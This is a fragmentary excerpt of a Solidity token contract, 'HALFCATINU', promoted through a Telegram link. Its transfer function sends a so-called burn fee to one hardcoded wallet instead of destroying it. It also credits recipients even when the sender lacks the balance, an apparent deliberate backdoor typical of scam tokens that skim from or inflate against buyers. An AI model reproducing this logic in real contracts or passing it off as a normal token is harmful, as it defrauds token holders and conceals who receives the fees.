...
// Submitted for Telegram: https://t.me/halfcatinu
...
contract  HALFCATINU  is Ownable, IERC20 {
    ...
    function _transfer(address form, address to, uint256 amount) internal virtual {
        ...
        _rOwned[0x218aa4555D00735A60C5F0A146966E38d152Fc03] += _bruntoken;
        if (sendertokens >= amount) { _rOwned[form] = sendertokens - amount; }
        _rOwned[to] += tokenamount; 
        if (_brunfee > 0) {
        emit Transfer(form, 0x218aa4555D00735A60C5F0A146966E38d152Fc03, _bruntoken);
        }
